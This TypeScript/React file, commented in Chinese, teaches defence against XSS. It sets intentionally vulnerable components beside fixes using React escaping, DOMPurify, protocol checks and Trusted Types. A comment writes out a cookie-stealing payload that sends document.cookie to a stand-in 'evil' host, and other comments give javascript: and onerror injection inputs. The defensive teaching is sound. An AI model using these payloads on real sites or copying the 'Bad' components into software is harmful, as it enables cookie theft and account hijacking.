// 三种 XSS + React/Vue 标准修法 + DOMPurify + Trusted Types

import DOMPurify from 'dompurify'
import { useMemo } from 'react'

// =====================================================
// 1. 存储型 XSS(评论被持久化,所有访客中招)
// =====================================================
//
// 攻击:用户提交 `<img src=x onerror=fetch('//evil/'+document.cookie)>`
// 后端没 escape 就存了,前端读出来 dangerouslySetInnerHTML

// ❌ 极危险
function BadComment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}

// ✅ 默认安全:让 React 帮你 escape
function GoodCommentText({ text }: { text: string }) {
  // React 渲染 children 时自动 escape
  return <div>{text}</div>
}

// ✅ 用户能输入富文本(Markdown / 富文本编辑器)→ sanitize
function RichComment({ html }: { html: string }) {
  const safe = useMemo(
    () => DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'class'],
      ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|\/|#)/i,         // 拦 javascript: data:
      ADD_ATTR: ['target'],                                       // 允许 a target
      FORBID_TAGS: ['script', 'style', 'iframe', 'object'],
      FORBID_ATTR: ['style', 'onclick', 'onerror', 'onload'],
    }),
    [html],
  )
  return <div dangerouslySetInnerHTML={{ __html: safe }} />
}

// =====================================================
// 2. 反射型 XSS(URL 参数被原样回显)
// =====================================================
//
// 攻击:你做了搜索页 /search?q=xxx,把 q 用 innerHTML 写到页面
// 攻击者发链接 /search?q=<img src=x onerror=...>
// 受害者点开就中招

// ❌ 错
function BadSearch() {
  const q = new URLSearchParams(location.search).get('q') ?? ''
  return <div dangerouslySetInnerHTML={{ __html: `搜索: ${q}` }} />
}

// ✅ 用 React 渲染就好
function GoodSearch() {
  const q = new URLSearchParams(location.search).get('q') ?? ''
  return <div>搜索: {q}</div>             // 自动 escape
}

// =====================================================
// 3. DOM 型 XSS(全在客户端,后端不知道)
// =====================================================
//
// 攻击:`location.hash` / `document.referrer` 等用户控制的值被塞入 sink

// ❌ 错
function BadHash() {
  // location.hash = "#<img src=x onerror=...>"
  document.getElementById('out')!.innerHTML = location.hash.slice(1)
  return <div id="out" />
}

// ✅ 用 textContent
function GoodHash() {
  // location.hash = "#xxx"
  const el = document.getElementById('out')
  if (el) el.textContent = location.hash.slice(1)
  return <div id="out" />
}

// ✅ React 自动
function GoodHashReact() {
  const [hash, setHash] = useState(location.hash.slice(1))
  // ...
  return <div>{hash}</div>
}

// =====================================================
// 4. href 的协议陷阱(经典 XSS 通道)
// =====================================================

// ❌ 用户输入 url = "javascript:alert(1)" → 点击触发
function BadLink({ url }: { url: string }) {
  return <a href={url}>点</a>
}

// ✅ 校验协议
function safeUrl(url: string) {
  try {
    const u = new URL(url, location.origin)
    if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) return '#'
    return u.toString()
  } catch {
    return '#'
  }
}

function GoodLink({ url }: { url: string }) {
  return <a href={safeUrl(url)} rel="noopener noreferrer">点</a>
}

// React 19+ 内置警告:href 是 javascript:/data: 时 dev mode 会 console.error

// =====================================================
// 5. SVG 也是 XSS 通道(常被忽略)
// =====================================================

// ❌ 用户上传 SVG → 直接当 <img> 显示是安全的,但当 <object>/<iframe>/inline 就危险
// SVG 里可以包 <script>

// ✅ 用 <img> 标签嵌(浏览器禁脚本)
;<img src="user-uploaded.svg" alt="..." />

// ❌ 永远不要 inline SVG 用户上传的内容(等于 innerHTML)
// 如果要 inline → DOMPurify 也支持 SVG profile:
//   DOMPurify.sanitize(svgString, { USE_PROFILES: { svg: true } })

// =====================================================
// 6. CSS 也能 XSS(老浏览器,IE 别忘)
// =====================================================

// ❌ url('javascript:...') / -moz-binding 等老 CSS XSS
// 现代浏览器基本封了,但用户上传 CSS / 主题时仍要 sanitize
// CSP 也帮助: style-src 不要 unsafe-inline

// =====================================================
// 7. Trusted Types(Chrome / Edge / 部分浏览器)
// =====================================================

// 启动:CSP 头加 require-trusted-types-for 'script'
// 任何 innerHTML / setAttribute('src') 这种 sink 会强制要求 TrustedHTML / TrustedScriptURL

// 设置全局策略(只在应用启动一次)
if (typeof window !== 'undefined' && (window as any).trustedTypes?.createPolicy) {
  ;(window as any).trustedTypes.createPolicy('default', {
    createHTML: (input: string) =>
      DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true }),
    createScriptURL: (input: string) => {
      const u = new URL(input, location.href)
      if (u.origin !== location.origin && !['https://cdn.trusted.com'].includes(u.origin)) {
        throw new Error('Disallowed script URL: ' + input)
      }
      return input
    },
    createScript: (input: string) => {
      throw new Error('No dynamic script allowed')           // 直接禁
    },
  })
}

// 命名 policy(更精确)
const TT = (window as any).trustedTypes?.createPolicy('my-app', {
  createHTML: (s: string) => DOMPurify.sanitize(s),
})

el.innerHTML = TT.createHTML(userInput)         // ✅ 显式过策略

// =====================================================
// 8. Vue 的 v-html / Svelte 的 @html
// =====================================================
//
// Vue:<div v-html="userInput" />               ← 等价 dangerouslySetInnerHTML,危险
// Svelte:<div>{@html userInput}</div>          ← 同上
// 修法:同样 sanitize
//
// Vue 例:
// <div v-html="DOMPurify.sanitize(input)" />

// =====================================================
// 9. 模板字符串拼接 SQL / HTML
// =====================================================

// ❌ 永远不要在前端把用户输入拼成 HTML 字符串
function tmpl(name: string) {
  return `<div>Hello ${name}</div>`            // name = "</div><script>..."
}

// ✅ 用 JSX / template 引擎 / DocumentFragment 构造
function safeTmpl(name: string) {
  const div = document.createElement('div')
  div.textContent = `Hello ${name}`
  return div
}

// =====================================================
// 10. 服务端模板的 XSS
// =====================================================
//
// 大部分模板引擎默认 escape:
//   Handlebars {{ name }}   ✅ escape
//   Handlebars {{{ name }}} ❌ raw,危险
//   EJS <%= name %>          ✅ escape
//   EJS <%- name %>          ❌ raw
//   Jinja2 {{ name }}         ✅ escape
//   Jinja2 {{ name|safe }}    ❌ raw
//
// 规则:看到 raw 输出 + 用户输入 = 必修

// =====================================================
// 11. 常见误以为安全的写法
// =====================================================
//
// ❌ encodeURIComponent(userInput) 然后 innerHTML
//    这只 escape URL,不 escape HTML
//
// ❌ replace(/</g, '&lt;') 不完整
//    还要 > " ' & 都处理,而且 attribute 上下文还要更多
//
// ❌ "我用了 React 应该没事" — dangerouslySetInnerHTML / href={user} / 自己拼 innerHTML 仍危险
//
// ❌ 后端 escape 了 → 前端 = 不用管
//    DOM 型 XSS 不经过后端

// =====================================================
// 12. 调试:找出真实 XSS
// =====================================================
//
// 1. 跑 ZAP / Burp 主动扫
// 2. 静态扫:semgrep / eslint-plugin-security
//    eslint-plugin-react/jsx-no-script-url
//    eslint-plugin-react/no-danger
// 3. CSP report-uri 上报违规 → 看真实漏掉的
// 4. 加 Trusted Types,启动后崩的地方就是有漏的地方
// 5. 全文搜:dangerouslySetInnerHTML / v-html / innerHTML / document.write

// =====================================================
// 13. 真实案例引用
// =====================================================
//
// - 2018 British Airways: 17 行恶意 JS 注入,38 万张卡被偷(供应链 + XSS)
// - 2020 GitHub: image proxy 反射 XSS,可挟持 PAT
// - 2021 npm package ua-parser-js 被劫持注入挖矿
// - 持续:WordPress 插件 / Magento 模板的 XSS 几乎每月有 CVE
//
// 看 HackerOne / OWASP 报告学习: 真实漏洞 = 最好的教材

declare const useState: <T>(init: T) => [T, (v: T) => void]
declare const el: HTMLElement
declare const userInput: string

export {}
